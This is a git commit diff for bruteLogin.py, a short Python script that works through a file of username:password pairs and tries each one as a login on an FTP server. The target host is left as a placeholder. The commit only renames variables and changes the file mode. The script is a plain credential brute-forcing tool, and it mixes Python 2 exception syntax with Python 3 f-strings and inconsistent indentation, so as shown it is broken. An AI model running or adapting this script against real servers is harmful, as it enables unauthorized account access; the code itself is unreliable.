cf35ce7cc61f986ea520837057ceab1fc18d4ca3
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2020-04-23 13:59:19 -0600

    Update bruteLogin.py

--- bruteLogin.py
+++ bruteLogin.py
@@ -1,23 +1,23 @@
 import ftplib, time
 
-def bruteLogin(hostname, passwdFile):
-    pF = open(passwdFile, 'r')
-    for line in pF.readlines():
+def bruteLogin(hostname, passwd_file):
+    pf = open(passwd_file, 'r+')
+    for line in pf.readlines():
 	time.sleep(1)
-        userName = line.split(':')[0]
-        passWord = line.split(':')[1].strip('\r').strip('\n')
-	print(f'[+] Trying: {userName}/{passWord}')
+        username = line.split(':')[0]
+        password = line.split(':')[1].strip('\r').strip('\n')
+	print(f'[+] Trying: {username}/{password}')
         try:
             ftp = ftplib.FTP(hostname)
-            ftp.login(userName, passWord)
-            print(f'\n[*] {hostname} FTP Logon Succeeded: {userName}/{passWord}')
+            ftp.login(username, password)
+            print(f'\n[*] {hostname} FTP Logon Succeeded: {username}/{password}')
             ftp.quit()
-            return (userName, passWord)
+            return (username, password)
         except Exception, e:
             pass
     print('\n[-] Could not brute force FTP credentials.')
     return (None, None)
 
 host = '{ADD HOST IP}'
-passwdFile = 'userpass.txt'
-bruteLogin(host, passwdFile)
+passwd_file = 'userpass.txt'
+bruteLogin(host, passwd_file)
